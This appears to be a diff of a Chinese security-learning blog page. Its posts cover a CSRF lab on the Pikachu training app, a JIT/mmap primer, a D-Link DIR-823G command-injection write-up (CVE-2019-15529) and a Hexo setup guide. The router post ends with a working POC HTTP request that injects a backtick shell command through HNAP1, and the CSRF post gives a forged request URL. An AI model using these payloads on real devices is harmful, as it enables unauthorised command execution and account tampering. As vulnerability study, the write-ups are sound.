+<h3 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h3><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p>
+<h3 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h3><ul>
+<li>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造<ul>
+<li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li>
+<li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li>
+</ul>
+</li>
+<li>2.确认凭证的有效期<ul>
+<li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li>
+</ul>
+</li>
+</ul>
+<h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>登录账号，抓取修改个人信息流量包。</p>
+<p><img src="https://i.loli.net/2020/11/04/oTmNylSJxc9vVGa.png" alt="11.PNG"></p>
+<p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p>
+<p>可以构造出CSRF攻击URL(bp抓的修改信息的包直接右键复制网址即可):</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit">http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit</a></p>
+</blockquote>
+<p>诱使登录状态的用户点击url就可以完成CSRF攻击。</p>
+<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器）,站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p>
+<p>步骤同get。但不知为何时灵时不灵。</p>
+<p>正常登录状态：</p>
+<p><img src="https://i.loli.net/2020/11/04/b7PA2OHu319LGlB.png" alt="捕获.PNG"></p>
+<p>点击恶意url后，用户信息直接被修改。</p>
+<p><img src="https://i.loli.net/2020/11/04/ZBbA8GrJfQtFe6U.png" alt="捕获.PNG"></p>
+<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h2><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p>
+<p>如图获取修改信息流量包后发现增加了token，无法利用。</p>
+<p><img src="https://i.loli.net/2020/11/04/4fFa5SkYcCtyZGj.png" alt="捕获.PNG"></p>
+<h2 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h2><ul>
+<li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li>
+<li>安全的会话管理（避免会话被利用）<ul>
+<li>不要再客户端保存敏感信息（身份认证信息）</li>
+<li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li>
+</ul>
+</li>
+<li>访问控制安全管理<ul>
+<li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li>
+<li>敏感信息的修改尽量使用post（post安全性高于get）</li>
+<li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li>
+</ul>
+</li>
+<li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/web/" rel="tag">web</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-JIT学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.108Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/">
+        JIT学习
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p>
+<p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p>
+<h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p>
+<p>例子：</p>
+<pre><code> #include&lt;stdio.h&gt;
+int inc(int a) {
+    return a + 1;
+}
+int main() {
+    printf("%d\n", inc(3));
+    return 0;
+}
+</code></pre>
+<p><code>objdump -d 1</code>查看它的机器码。</p>
+<pre><code>0000000000400526 &lt;inc&gt;:
+  400526:	55                   	push   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器
+  400527:	48 89 e5             	mov    %rsp,%rbp
+  40052a:	89 7d fc             	mov    %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3
+  40052d:	8b 45 fc             	mov    -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中
+  400530:	83 c0 01             	add    $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递
+  400533:	5d                   	pop    %rbp
+  400534:	c3                   	retq   
+</code></pre>
+<p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p>
+<pre><code> #include&lt;stdio.h&gt;
+ #include&lt;memory.h&gt;
+ #include&lt;sys/mman.h&gt;
+typedef int (* inc_func)(int a); 
+int main() {
+    char code[] = { 
+        0x55,             // push rbp
+        0x48, 0x89, 0xe5, // mov rsp, rbp
+        0x89, 0xf8,       // mov edi, eax
+        0x83, 0xc0, 0x01, // add $1, eax
+        0x5d,             // pop rbp
+        0xc3              // ret
+    };  
+    void * temp = mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC,
+            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); 
+    memcpy(temp, code, sizeof(code));
+    inc_func p_inc = (inc_func)temp;
+    printf("%d\n", p_inc(7));
+    return 0;
+}
+</code></pre>
+<p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p>
+<p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">chrome知识点</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-Dlink-Dir-823G路由器漏洞挖掘过程" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.104Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/">
+        Dlink DIR-823G 漏洞挖掘过程
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>固件下载地址： <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA">https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA</a> 提取码：1ly1</p>
+<h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p><b>D-Link DIR-823G命令注入漏洞：</b></p>
+<p>CVE编号：CVE-2019-15529</p>
+<p>D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 </p>
+<h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><ul>
+<li>binwalk -Me 固件.bin //解开固件</li>
+</ul>
+<p><img src="https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png" alt="捕获.PNG"></p>
+<p>是一个squashfs文件系统，标准linux目录结构。</p>
+<ul>
+<li>cat /etc/init.d/rcS //查看路由器开启的服务。</li>
+</ul>
+<p>发现一个goahead进程。</p>
+<blockquote>
+<p>GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。<br><code>websUrlHandlerDefine(T("/goform"), NULL, 0, websFormHandler, 0);</code> /goform的请求交给websFormHandler函数处理<br><code>websUrlHandlerDefine(T("/cgi-bin"), NULL, 0, websCgiHandler, 0);</code> /cgi-bin的请求交给websCgiHandler函数处理。</p>
+</blockquote>
+<h2 id="模拟运行固件"><a href="#模拟运行固件" class="headerlink" title="模拟运行固件"></a>模拟运行固件</h2><p>环境使用工具firmware-ayalysis-toolkit。</p>
+<p>搭建教程：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/110806057">https://zhuanlan.zhihu.com/p/110806057</a></p>
+<p>运行起来后nmap扫端口，发现开了http服务和dns服务。</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.0.1,可看到dlink登录页面.要求用户做一些设置,不需要密码即可登录./">http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。</a></p>
+<p><img src="https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png" alt="捕获.PNG"></p>
+<p>在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。</p>
+<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><b><code>/cgi-bin/ExportSettings.sh</code> 导出配置文件，造成信息泄露。</b></p>
+<p><img src="https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png" alt="捕获.PNG"></p>
+<p><b><code>/cgi-bin/upload_settings.cgi</code> 导入配置文件，可导入恶意篡改后的配置。</b></p>
+<p><img src="https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png" alt="捕获.PNG"></p>
+<p><b><code>/cgi-bin/GetDownLoadSyslog.sh</code> 获取系统部分启动信息<code>/var/log/messages*</code></b></p>
+<p><img src="https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png" alt="捕获.PNG"></p>
+<p><b><code>/cgi-bin/upload_firmware.cgi</code> 上传更新固件，可恶意修改固件</b></p>
+<h2 id="goahead-自定义的请求处理函数"><a href="#goahead-自定义的请求处理函数" class="headerlink" title="goahead 自定义的请求处理函数"></a>goahead 自定义的请求处理函数</h2><blockquote>
+<p>处理函数的参数列表：<br>int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t <em>path, char_t</em> query)<br>goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节.</p>
+</blockquote>
+<p>IDA打开goahead分析：</p>
+<p>通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C.</p>
+<p><img src="https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png" alt="捕获.PNG"></p>
+<p>websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。</p>
+<p>抓取登录数据包，发现往/HNAP1发送。</p>
+<p><img src="https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png" alt="捕获.PNG"></p>
+<p>分析/HNAP1（0x42383C）处理函数逻辑:</p>
+<p><img src="https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png" alt="捕获.PNG"></p>
+<p>从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。</p>
+<p>找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。</p>
+<p><img src="https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png" alt="捕获.PNG"></p>
+<p>此处可以直接注入’来命令执行。</p>
+<blockquote>
+<p>在PHP中常用到以下几个函数来执行外部命令:<br>system</p>
+<blockquote>
+<p>system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能</p>
+</blockquote>
+<p>exec<br>passthru<br>shell_exec</p>
+</blockquote>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1
+Content-Length: 53
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Content-Type: text/xml; charset=UTF-8
+Accept: */*
+SOAPAction: "http://purenetworks.com/HNAP1/Login"
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Connection: close
+'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'
+</code></pre>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/IOT/" rel="tag">IOT</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-Win10下使用Hexo搭建个人博客" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="article-date">
+  	<time datetime="2022-08-07T08:48:45.000Z" itemprop="datePublished">2022-08-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">
+        Win10下使用Hexo搭建个人博客
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="下载安装git、nodejs"><a href="#下载安装git、nodejs" class="headerlink" title="下载安装git、nodejs"></a>下载安装git、nodejs</h2><p>下载地址: </p>
+<p>git: <a target="_blank" rel="noopener" href="https://git-scm.com/">https://git-scm.com/</a> </p>
+<p>nodejs: <a target="_blank" rel="noopener" href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p>
+<p>将nodejs加入path环境变量中。打开cmd测试：</p>
+<p><img src="https://s2.loli.net/2022/08/07/NduraiRMcEQythF.png" alt="图片.png"></p>
+<blockquote>
+<p>报错1：输入 <code>npm-v</code> 出现报错:</p>
+</blockquote>
+<pre><code>npm WARN config global --global, --local are deprecated. Use `–location
+</code></pre>
+<p>解决方法：打开<code>nodejs</code>安装位置文件夹，打开<code>npm.cmd</code>和<code>npm</code>，将文件中的<code>prefix -g</code>替换为<code>prefix --location=global</code>,保存后重新打开cmd测试即可。</p>
+<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><h3 id="换源（淘宝源）"><a href="#换源（淘宝源）" class="headerlink" title="换源（淘宝源）"></a>换源（淘宝源）</h3><pre><code>npm install -g cnpm --registry=https://registry.npm.taobao.org
+cnpm -v 
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/07/9zM1KhnkOqAFsU6.png" alt="图片.png"></p>
+<p>查看版本以及是否安装成功。</p>
+<h3 id="安装hexo-1"><a href="#安装hexo-1" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code>cnpm install -g hexo-cli
+hexo -v
+</code></pre>
+<p>新建文件夹放置博客内容，在cmd中进入所建立的目录：</p>
+<pre><code>hexo init #初始化hexo
+hexo s #启动hexo
+</code></pre>
+<p>访问 <code> http://localhost:4000/</code>如下即成功：</p>
+<p><img src="https://s2.loli.net/2022/08/07/dvIiunG5yhOEUX8.png" alt="图片.png"></p>
+<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><pre><code>hexo new "文章标题"
+</code></pre>
+<p>在目录/source/_posts/下生成文件.md<br>更新文章：<br>    hexo clean<br>    hexo g<br>    hexo s</p>
+<h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><p>1、建立一个新的库，命名需要符合规则：<code>username.gitgub.io</code><br>2、命令行输入：</p>
+<pre><code>cnpm install --save hexo-deployer-git  
+</code></pre>
+<p>3、更改设置</p>
+<p>找到_config.yml文件，翻到最底部</p>
+<p>将<code>type</code>改为<code>git</code></p>
+<p>添加<code>repo: "此处为仓库地址"</code></p>
+<p>添加<code>branch: master</code></p>
+<p>repo为仓库地址 branch为master即可</p>
+<p><img src="https://s2.loli.net/2022/08/07/akWVI3mUinyP2sJ.png" alt="图片.png"></p>
+<p>4、部署到远端</p>
+<pre><code>git config --global user.email "xxx(此处为邮箱)"  
+git config --global user.name "xxx(此处为用户名)"  #github用户名
+hexo d  
+</code></pre>
+<p>弹出网页提示是否关联git和github 授权即可</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
   
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/SinkyQ/SinkyQ.github.io.git/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/">1</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/2/">2</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/3/">3</a><span class="page-number current">4</span>
+    </nav>
   
 </div>
-
-  </footer>
-
-  <!-- Scripts -->
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2022 Sinky
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
   
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+<link rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/fancybox/jquery.fancybox.css">
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/events.js" ></script>
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/plugins.js" ></script>
 
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: true,
+		isPost: false,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+<script src="/SinkyQ/SinkyQ.github.io.git/js/main.js"></script>
 
 
 
 
-  
-    <script  src="/SinkyQ/SinkyQ.github.io.git/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
+  </div>
 </body>
 </html>
